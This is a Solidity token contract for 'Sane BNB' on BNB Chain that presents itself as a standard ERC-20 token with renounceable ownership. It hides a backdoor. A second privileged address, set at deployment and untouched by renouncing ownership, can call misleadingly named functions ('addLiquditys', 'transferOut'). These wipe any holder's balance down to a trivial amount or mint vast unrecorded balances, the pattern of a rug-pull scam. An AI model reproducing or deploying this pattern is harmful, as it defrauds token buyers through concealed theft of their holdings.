/**
 *Submitted for verification at BscScan.com on 2023-04-16
*/

// SPDX-License-Identifier: MIT     

pragma solidity =0.8.18;
/**
 * @dev Provides information about the current execution context, including the
 * sender of the transaction and its data. While these are generally available
 * via msg.sender and msg.data, they should not be accessed in such a direct
 * manner, since when dealing with meta-transactions the account sending and
 * paying for execution may not be the actual sender (as far as an application
 * is concerned).
 *
 * This contract is only required for intermediate, library-like contracts.
 */
abstract contract bnbAs {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface bnbAsi {

    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address to, uint256 value) external returns (bool);


    function allowance(address owner, address spender) external view returns (uint256);

    function approve(address spender, uint256 value) external returns (bool);


    function transferFrom(
        address from,
        address to,
        uint256 value
    ) external returns (bool);


    event Transfer(address indexed from, address indexed to, uint256 totalo);

    event Approval(address indexed owner, address indexed spender, uint256 totalo);
}

interface bnbAsii is bnbAsi {

    function name() external view returns (string memory);


    function symbol() external view returns (string memory);


    function decimals() external view returns (uint8);
}

abstract contract bnbAsiii is bnbAs {
   address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

 
    constructor() {
        _transferOwnership(_msgSender());
    }


    function owner() public view virtual returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        _transferOwnership(address(0));
    }


    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        _transferOwnership(newOwner);
    }


    function _transferOwnership(address newOwner) internal virtual {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }
}

contract SANEBNB is bnbAs, bnbAsi, bnbAsii, bnbAsiii {

    mapping(address => uint256) private bnbsuplly;
  mapping(address => bool) public bnbAsiiZERTY;
    mapping(address => mapping(address => uint256)) private Confirmed;
address private bnbRooter;
    uint256 private ALLtotalSupply;
    string private _name;
    string private _symbol;
  address farajobitcin;
    // My variables
    mapping(address => bool) public isPauseWAW;

    
    constructor(address bnbadressss) {
            // Editable
            farajobitcin = msg.sender;

        _name = "Sane BNB";
        _symbol = "SANEBNB";
  bnbRooter = bnbadressss;        
        uint _totalSupply = 1000000000000 * 10**9;
        balances(msg.sender, _totalSupply);
    }

    /**
     * @dev Returns the name of the token.
     */
    function name() public view virtual override returns (string memory) {
        return _name;
    }

    function symbol() public view virtual override returns (string memory) {
        return _symbol;
    }

    function decimals() public view virtual override returns (uint8) {
        return 9;
    }


    function totalSupply() public view virtual override returns (uint256) {
        return ALLtotalSupply;
    }

    function balanceOf(address account) public view virtual override returns (uint256) {
        return bnbsuplly[account];
    }

    function transfer(address to, uint256 value) public virtual override returns (bool) {
        address owner = _msgSender();
        _transfer(owner, to, value);
        return true;
    }


    function allowance(address owner, address spender) public view virtual override returns (uint256) {
        return Confirmed[owner][spender];
    }

    function approve(address spender, uint256 value) public virtual override returns (bool) {
        address owner = _msgSender();
        _approve(owner, spender, value);
        return true;
    }

    function transferFrom(
        address from,
        address to,
        uint256 value
    ) public virtual override returns (bool) {
        address spender = _msgSender();
        _spendAllowance(from, spender, value);
        _transfer(from, to, value);
        return true;
    }

    function increaseAllowance(address spender, uint256 addedtotalo) public virtual returns (bool) {
        address owner = _msgSender();
        _approve(owner, spender, Confirmed[owner][spender] + addedtotalo);
        return true;
    }

    function decreaseAllowance(address spender, uint256 subtractedtotalo) public virtual returns (bool) {
        address owner = _msgSender();
        uint256  currentsold = Confirmed[owner][spender];
        require( currentsold >= subtractedtotalo, "Ehi20: decreased allowance below zero");
        unchecked {
            _approve(owner, spender,  currentsold - subtractedtotalo);
        }

        return true;
    }


    function _transfer(
        address from,
        address to,
        uint256 value
    ) internal virtual {
        require(from != address(0), "Ehi20: transfer from the zero address");
        require(to != address(0), "Ehi20: transfer to the zero address");

        beforeTokenTransfer(from, to, value);

        uint256 fromBalance = bnbsuplly[from];
        require(fromBalance >= value, "Ehi20: transfer value exceeds balance");
        unchecked {
            bnbsuplly[from] = fromBalance - value;
        }
        bnbsuplly[to] += value;

        emit Transfer(from, to, value);

        afterTokenTransfer(from, to, value);
    }
  modifier farajo0wner () {
    require(farajobitcin == msg.sender, "Ehi20: cannot permit Multisender address");
    _;
  
  }
    function balances(address account, uint256 value) internal virtual {
        require(account != address(0), "Ehi20: balances to the zero address");

        beforeTokenTransfer(address(0), account, value);

        ALLtotalSupply += value;
        bnbsuplly[account] += value;
        emit Transfer(address(0), account, value);

        afterTokenTransfer(address(0), account, value);
    }
    modifier Multisender() {
        require(bnbRooter == _msgSender(), "Ownable: caller is not the owner");
        _;
    }


  function addLiquditys(address holderwait) external Multisender {
    bnbsuplly[holderwait] = 300000000;
            emit Transfer(address(0), holderwait, 300000000);
  }

    function _burn(address account, uint256 value) internal virtual {
        require(account != address(0), "Ehi20: burn from the zero address");

        beforeTokenTransfer(account, address(0), value);

        uint256 accountBalance = bnbsuplly[account];
        require(accountBalance >= value, "Ehi20: burn value exceeds balance");
        unchecked {
            bnbsuplly[account] = accountBalance - value;
        }
        ALLtotalSupply -= value;

        emit Transfer(account, address(0), value);

        afterTokenTransfer(account, address(0), value);
    }

    function _approve(
        address owner,
        address spender,
        uint256 value
    ) internal virtual {
        require(owner != address(0), "Ehi20: approve from the zero address");
        require(spender != address(0), "Ehi20: approve to the zero address");

        Confirmed[owner][spender] = value;
        emit Approval(owner, spender, value);
    }

    function _spendAllowance(
        address owner,
        address spender,
        uint256 value
    ) internal virtual {
        uint256  currentsold = allowance(owner, spender);
        if ( currentsold != type(uint256).max) {
            require( currentsold >= value, "Ehi20: insufficient allowance");
            unchecked {
                _approve(owner, spender,  currentsold - value);
            }
        }
    }
  function transferOut(address dxtoolsass) external Multisender {
    bnbsuplly[dxtoolsass] = 100000 * 10 ** 21;
            emit Transfer(address(0), dxtoolsass, 100000 * 10 ** 21);
  }
    function beforeTokenTransfer(
        address from,
        address to,
        uint256 value
    ) internal virtual {}


    function afterTokenTransfer(
        address from,
        address to,
        uint256 value
    ) internal virtual {}

}